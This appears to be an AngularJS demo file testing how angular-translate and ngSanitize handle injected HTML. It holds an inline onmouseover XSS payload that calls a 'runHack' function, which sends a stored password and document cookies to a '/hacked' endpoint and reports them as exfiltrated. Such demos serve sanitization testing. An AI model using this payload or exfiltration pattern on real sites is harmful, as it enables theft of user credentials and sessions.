var translations = {};

var app = angular.module('myApp_sanitize', [
  'pascalprecht.translate',
  'ngSanitize',
]);

app.config([
  '$translateProvider',
  function ($translateProvider) {
    $translateProvider.translations('en', translations);
    $translateProvider.preferredLanguage('en');

    $translateProvider.useSanitizeValueStrategy('escape'); // works regardless

    localStorage.setItem('password', 'super-secret-password');
    document.cookie =
      'cookieName=cookieValue; expires=Thu, 18 Dec 2024 12:00:00 UTC; path=/';
  },
]);

function runHack(password) {
  const url =
    `/hacked?password=` +
    password +
    '&session=' +
    encodeURIComponent(document.cookie);
  fetch(url)
    .then((res) => res.json())
    .then((result) => {
      const message =
        `Response from ${url}` +
        result.message +
        '\n' +
        'Exfiltrated: ' +
        result.password;

      alert(message);
    })
    .catch((err) => {
      console.warn('Failed hack', err);
      alert('Failed to extract');
    });
}

app.controller('Ctrl', [
  '$scope',
  function ($scope) {
    $scope.input = '';

    var str = `
    <div onmouseover="javascript:runHack(localStorage.getItem('password'))"> 
      <strong>MOUSE</strong> <u>OVER</u> <blink>ME</blink>!
    </div> 
  `;
    $scope.input = str;
  },
]);
